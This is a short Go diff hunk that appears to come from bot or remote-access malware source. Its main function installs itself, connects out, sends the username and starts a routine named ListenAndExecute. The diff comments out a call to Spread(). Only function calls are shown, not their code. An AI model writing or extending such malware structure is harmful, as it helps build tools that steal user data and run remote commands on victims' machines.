@@ -26,7 +26,7 @@ func main() {
 	//Check if already running
 	instances.CheckMultiInstances()
 	install.Install()
-	go Spread()
+	//go Spread()
 	network.Connect()
 	network.Send("user", utils.GetUsername())
 	go ListenAndExecute()
